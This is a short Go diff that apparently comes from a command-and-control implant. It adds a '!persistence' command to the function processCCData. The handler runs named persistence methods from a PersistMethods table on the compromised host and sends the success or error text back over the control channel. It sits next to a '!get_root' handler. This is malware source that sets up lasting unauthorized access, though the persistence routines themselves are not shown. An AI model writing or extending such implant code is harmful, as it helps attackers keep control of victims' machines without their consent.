@@ -129,6 +129,28 @@ func processCCData(data *MsgTunData) {
 			return
 		}
 
+		// persistence
+		if cmdSlice[0] == "!persistence" {
+			if len(cmdSlice) != 2 {
+				return
+			}
+
+			for key, method := range PersistMethods {
+				if cmdSlice[1] == key {
+					err = method()
+					out = fmt.Sprintf("Success: %s", key)
+					if err != nil {
+						out = fmt.Sprintf("Error: %v", err)
+					}
+				}
+			}
+			if out == "" {
+				out = "No such method available"
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
 		// get_root
 		if cmdSlice[0] == "!get_root" {
 			if os.Geteuid() == 0 {
